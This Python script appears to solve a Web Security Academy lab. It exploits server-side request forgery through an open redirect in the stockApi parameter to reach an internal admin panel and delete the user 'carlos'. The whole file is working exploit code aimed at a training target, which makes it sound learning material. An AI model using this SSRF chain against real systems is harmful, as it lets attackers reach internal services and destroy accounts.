import requests
import sys



def delete_carlos_user(url):
    try:
        # Deleting the user "carlos"
        requests.post(f"{url}/product/stock", data ={"stockApi": "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos"}, timeout=10)

        # Verifying user has been deleted
        response = requests.post(f"{url}/product/stock", data ={"stockApi": "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/"}, timeout=10)
        return "carlos" not in response.text and response.status_code == 200

    except requests.exceptions.Timeout:
        print("(-) Request timed out. Please check your URL and try again.")
        sys.exit(1)

    except requests.exceptions.MissingSchema:
        print(f"(-) Invalid URL.")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)


    url = sys.argv[1].rstrip("/")
    print("(+) Deleting the user \"carlos\"...")
    if delete_carlos_user(url):
        print("(+) Successfully deleted the user \"carlos\"!")
    else:
        print("(-) The user \"carlos\" was not successfully deleted. Please check your URL and try again.")


if __name__ == "__main__":
    main()